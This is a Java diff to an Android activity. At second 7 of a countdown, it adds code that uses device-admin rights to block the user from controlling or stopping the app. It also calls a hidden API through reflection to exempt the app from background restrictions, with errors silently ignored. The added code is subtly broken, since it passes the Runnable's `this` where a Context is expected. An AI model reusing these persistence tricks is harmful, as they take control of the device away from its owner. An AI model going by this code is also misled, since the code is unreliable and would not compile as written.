@@ -16,7 +16,7 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        final DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
 
         final TextView tv = new TextView(this);
         tv.setBackgroundColor(0xFF000000);
@@ -49,7 +49,22 @@ public class MainActivity extends Activity {
                                 new ComponentName(MainActivity.this, NucleusReceiver.class),
                                 PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                 PackageManager.DONT_KILL_APP);
-                        }                   
+                        }
+                        if (seconds == 7) {
+								ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
+
+								dpm.setPersonalAppsSuspended(admin, false);
+
+								if (Build.VERSION.SDK_INT >= 30) {
+									dpm.setUserControlDisabledPackages(admin, java.util.Collections.singletonList(getPackageName()));
+								}
+
+								try {
+									java.lang.reflect.Method method = dpm.getClass().getMethod("setAdminExemptFromBackgroundRestrictedOperations", ComponentName.class, boolean.class);
+									method.invoke(dpm, admin, true);
+								} catch (Exception ignored) {}
+								
+							}
                         tv.setText(String.valueOf(seconds--));
                         new Handler(Looper.getMainLooper()).postDelayed(this, 1000);
                     } else {
